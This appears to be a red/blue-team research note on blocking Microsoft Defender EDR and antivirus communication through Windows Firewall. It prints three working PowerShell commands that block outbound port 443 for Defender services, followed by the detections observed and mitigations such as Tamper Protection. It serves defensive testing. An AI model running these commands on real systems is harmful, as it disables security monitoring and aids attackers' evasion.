# Firewall Tampering, Blocking EDR/AV communication
Microsoft Defender Antivirus detects and **prevents tampering** with the creation of firewall rules for both Microsoft Defender for Endpoint and Microsoft Defender Antivirus.

## Red Note (test insights)
**[Bypassing Defender EDR using Windows Firewall - mitigations](https://write-verbose.com/2022/05/31/EDRBypass/)**
```Powershell
New-NetFirewallRule -DisplayName "Block 443 MsMpEng" -Name "Block 443 MsMpEng" -Direction Outbound -Service WinDefend -Enabled True -RemotePort 443 -Protocol TCP -Action Block
New-NetFirewallRule -DisplayName "Block 443 SenseCncProxy" -Name "Block 443 SenseCncProxy" -Direction Outbound -Program "%ProgramFiles%\Windows Defender Advanced Threat Protection\SenseCncProxy.exe" -RemotePort 443 -Protocol TCP -Action Block
New-NetFirewallRule -DisplayName "Block 443 MsSense" -Name "Block 443 MsSense" -Direction Outbound -Program "%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe" -RemotePort 443 -Protocol TCP -Action Block
```


## Alerts & Detections
After testing, Microsoft Defender Antivirus detected these alerts.

- [x] An active 'MpTamperBlockNewFirewall' malware was prevented from executing via AMSI
- [x] An active 'DefenderFirewallTamper' malware in a command line was prevented from executing
- [x] Suspicious 'WDBlockFirewallRule' behavior was blocked

![image](https://github.com/LearningKijo/ResearchDev/assets/120234772/7d86f078-852b-482b-bd4d-51c4b79c467d)

![image](https://github.com/LearningKijo/ResearchDev/assets/120234772/1dd25ae9-0f60-4391-93a1-a5b3b1bc3118)

## Blue Note
Since firewall tampering activities are detected and prevented by the antivirus, please ensure that these configurations are properly implemented.
- Turn on [Microsoft Defender Antvirus](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/next-generation-protection?view=o365-worldwide) (Including Real-Time Protection, Cloud Protection, Sample Submission and so on)
- Turn on [Tamper Protection](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide&ocid=magicti_ta_learndoc)

#### Disclaimer
The views and opinions expressed herein are those of the author and do not necessarily reflect the views of company.
